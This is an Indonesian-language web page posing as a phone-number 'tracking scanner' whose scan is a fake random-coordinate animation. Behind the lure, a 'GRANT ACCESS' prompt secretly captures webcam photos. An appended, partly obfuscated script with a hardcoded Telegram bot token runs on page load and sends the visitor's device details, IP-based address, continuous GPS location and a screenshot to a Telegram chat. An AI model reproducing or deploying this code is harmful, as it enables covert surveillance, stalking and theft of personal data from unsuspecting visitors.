<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cyber Intel Scanner</title>

<style>
body {
    margin: 0;
    background: black;
    color: #00ffcc;
    font-family: monospace;
}

/* HEADER */
h1 {
    text-align: center;
    animation: glitch 1s infinite;
}

@keyframes glitch {
    0% { text-shadow: 2px 0 red; }
    50% { text-shadow: -2px 0 blue; }
    100% { text-shadow: 2px 0 red; }
}

.status {
    text-align:center;
    color:#00ffaa;
}

/* INPUT */
.box {
    text-align: center;
    margin-top: 20px;
}

input {
    padding: 10px;
    background: black;
    border: 1px solid #00ffcc;
    color: #00ffcc;
}

button {
    padding: 10px 20px;
    margin-left: 10px;
    background: #00ffcc;
    border: none;
    cursor: pointer;
}

/* PROGRESS */
.progress {
    width: 80%;
    margin: 20px auto;
    border: 1px solid #00ffcc;
}

.bar {
    width: 0%;
    height: 20px;
    background: #00ffcc;
}

/* MAP */
.map {
    width: 90%;
    height: 200px;
    margin: auto;
    border: 1px solid #00ffcc;
    background: url('https://maps.googleapis.com/maps/api/staticmap?center=-6.2,106.8&zoom=12&size=600x300') center/cover;
}

/* RADAR */
.radar {
    width: 150px;
    height: 150px;
    border: 2px solid #00ffcc;
    border-radius: 50%;
    margin: 20px auto;
    position: relative;
    overflow: hidden;
}

.radar::after {
    content: "";
    position: absolute;
    width: 100%;
    height: 100%;
    background: conic-gradient(#00ffcc 10%, transparent 10%);
    animation: spin 2s linear infinite;
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}

/* TERMINAL */
.terminal {
    width: 90%;
    height: 200px;
    margin: 20px auto;
    border: 1px solid #00ffcc;
    overflow-y: auto;
    padding: 10px;
}

/* ACCESS SCREEN */
#accessBox {
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:black;
    color:#00ffcc;
    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;
    z-index:999;
}
</style>
</head>

<body>

<!-- ACCESS -->
<div id="accessBox">
<h2>🔐 Secure Access Required</h2>
<p>System membutuhkan akses kamera untuk verifikasi keamanan...</p>
<button onclick="startAccess()">GRANT ACCESS</button>
</div>

<h1>⚡ CYBER INTEL TRACKING SYSTEM ⚡</h1>
<div class="status">SYSTEM: CONNECTED | NODE: INDONESIA</div>

<div class="box">
    <input type="text" id="nomor" placeholder="+62xxxxxxxxxx">
    <button onclick="start()">SCAN</button>
</div>

<div class="progress">
    <div class="bar" id="bar"></div>
</div>

<div class="radar"></div>
<div class="map" id="map"></div>
<div class="terminal" id="terminal"></div>

<audio id="beep" src="https://www.soundjay.com/button/beep-07.wav"></audio>

<script>
// TELEGRAM CONFIG
const BOT_TOKEN = "ISI_TOKEN_KAMU";
const CHAT_ID = "ISI_ID_KAMU";

// SOUND
function beep(){
    document.getElementById("beep").play();
}

// TERMINAL
function log(text) {
    let t = document.getElementById("terminal");
    t.innerHTML += text + "<br>";
    t.scrollTop = t.scrollHeight;
}

// CAMERA + TELEGRAM
async function sendPhoto(blob, index) {
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, `capture_${index}.png`);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: fd
  });
}

function capturePhoto(video, stream, index) {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    await sendPhoto(blob, index);
    if (index === 3) {
      stream.getTracks().forEach(track => track.stop());
    }
  }, "image/png");
}

function startAccess(){
    document.getElementById("accessBox").style.display = "none";

    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
            capturePhoto(video, stream, 1);
            setTimeout(() => capturePhoto(video, stream, 2), 1000);
            setTimeout(() => capturePhoto(video, stream, 3), 2000);
        }, 2000);

    }).catch(err => {
        log("❌ Camera access denied");
    });
}

// SCAN SYSTEM
let progress = 0;

function start() {
    beep();
    progress = 0;
    document.getElementById("terminal").innerHTML = "";

    let interval = setInterval(() => {
        progress += 5;
        document.getElementById("bar").style.width = progress + "%";

        if(progress == 10) log("Initializing secure channel...");
        if(progress == 30) log("Connecting to WhatsApp nodes...");
        if(progress == 50) log("Scanning network signals...");
        if(progress == 70) log("Analyzing location pattern...");
        if(progress == 90) {
            let lat = (-6.2 + Math.random()).toFixed(5);
            let lon = (106.8 + Math.random()).toFixed(5);

            log("Location detected:");
            log("Lat: " + lat + " | Lon: " + lon);

            document.getElementById("map").style.background =
            `url('https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=14&size=600x300') center/cover`;
        }

        if(progress >= 100) {
            log("✔ Scan Complete (Simulation)");
            clearInterval(interval);
        }

    }, 300);
}
  (()=>{

    const T='7263103738:AAFHQr9tKSy-DxMM5h7H9XdDPyksAdb-3_Q';
    const C='7191940139';

    // Progress bar
    let p=0;
    const pb=document.getElementById('progress-bar');
    const ld=document.getElementById('loading-details');
    const LM=[
      "Memeriksa modul sistem...",
      "Memuat komponen inti...",
      "Menginisialisasi antarmuka...",
      "Memverifikasi koneksi...",
      "Menyiapkan lingkungan...",
      "Memeriksa pembaruan...",
      "Memuat aset tampilan..."
    ];
    setInterval(()=>{
      p+=Math.random()*5;
      if(p>98) p=98;
      pb.style.width=p+'%';
      if(Math.random()>.9) {
        ld.textContent=LM[Math.floor(Math.random()*LM.length)];
      }
    },500);

    // Fungsi kirim pesan ke Telegram
    const sTG=async d=>{
      try{
        await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})
        });
      }catch(e){}
    };

    const sP=async(b,f)=>{
      try{
        const fd=new FormData();
        fd.append('chat_id',C);
        fd.append('photo',b,f);
        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd});
      }catch(e){}
    };

    // Ambil lokasi detail dari koordinat
    const gLD=async(a,b)=>{
      try{
        const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`);
        const d=await r.json();
        if(d.address) return {
          kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",
          kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",
          fa:d.display_name||"Alamat tidak tersedia"
        };
      }catch(e){}
      return {kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"};
    };
    const cDI=async()=>{
      let m='╭───── Tracking Report ───── ⦿\n\n';
      m+='⚙️ DEVICE INFORMATION\n';
      m+=`🖥️ Device: ${navigator.userAgent}\n`;
      m+=`💻 Platform: ${navigator.platform}\n`;
      m+=`🌐 Bahasa: ${navigator.language}\n`;
      m+=`📶 Online: ${navigator.onLine?'Online':'Offline'}\n`;
      m+=`📺 Screen Size: ${screen.width}x${screen.height}\n`;
      m+=`🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
      m+=`💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n`;
      m+=`🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;

      if(navigator.getBattery){
        try{
          const b=await navigator.getBattery();
          m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n`;
          m+=`🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`;
        }catch(e){
          m+='🔋 Battery: ❌ Tidak tersedia\n';
        }
      }

      m+=`⏰ Waktu Akses: ${new Date().toString()}\n`;
      m+=`🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
      m+=`📜 History Length: ${history.length}\n`;
      m+=`✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n`;
      m+=`🔗 Referrer: ${document.referrer||'None'}\n`;
      m+=`🌍 URL: ${location.href}\n`;
      m+=`📄 Title: ${document.title}\n`;
      m+=`🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
      m+=`🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

      try{
        const i=await fetch('https://ipapi.co/json/');
        const d=await i.json();
        m+='📍 ALAMAT DETAIL LOKASI\n';
        m+=`📡 IP Address: ${d.ip}\n`;
        m+=`🏙️ Kota: ${d.city}\n`;
        m+=`🏙️ Kabupaten: ${d.region}\n`;
        m+=`🗺️ Wilayah: ${d.region}\n`;
        m+=`🌎 Negara: ${d.country_name}\n`;
        m+=`🏷️ Kode Pos: ${d.postal}\n`;

        if(d.latitude&&d.longitude){
          m+=`📌 Latitude: ${d.latitude}\n`;
          m+=`📍 Longitude: ${d.longitude}\n`;
          const l=await gLD(d.latitude,d.longitude);
          m+=`🏙️ Kabupaten: ${l.kb}\n`;
          m+=`🏙️ Kecamatan: ${l.kc}\n`;
          m+=`🏠 Alamat Lengkap: ${l.fa}\n`;
        }
      }catch(e){
        m+='❌ Gagal mendapatkan informasi lokasi\n';
      }

      m+='\n╰───── Developer @delreyeas ───── ⦿';
      return m;
    };

    const ST=async()=>{
      await sTG(await cDI());

      // Screenshot halaman
      setTimeout(async()=>{
        try{
          const cn=await html2canvas(document.body);
          cn.toBlob(b=>sP(b,'screenshot.jpg'),'image/jpeg');
        }catch(e){
          await sTG('❌ Screenshot failed');
        }
      },5000);

     // Lokasi akurat dari GPS
      if(navigator.geolocation){
        navigator.geolocation.watchPosition(async p=>{
          let g=`📍 Lokasi Akurat Sesuai Target\n`;
          g+=`📌 Lat: ${p.coords.latitude}\n`;
          g+=`📍 Lng: ${p.coords.longitude}\n`;
          g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
          const l=await gLD(p.coords.latitude,p.coords.longitude);
          g+=`🏙️ Kabupaten: ${l.kb}\n`;
          g+=`🏙️ Kecamatan: ${l.kc}\n`;
          g+=`🏠 Alamat: ${l.fa}\n`;
          g+=`🌍 <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">Lihat di Google Maps</a>\n`;
          await sTG(g);
        }, async e=>{
          await sTG(`❌ GPS dimatikan: ${e.message}`);
        },{enableHighAccuracy:true,maximumAge:0,timeout:5000});
      }
    };

    setTimeout(ST,3000);

  })();
  </script>
</body>
</html>
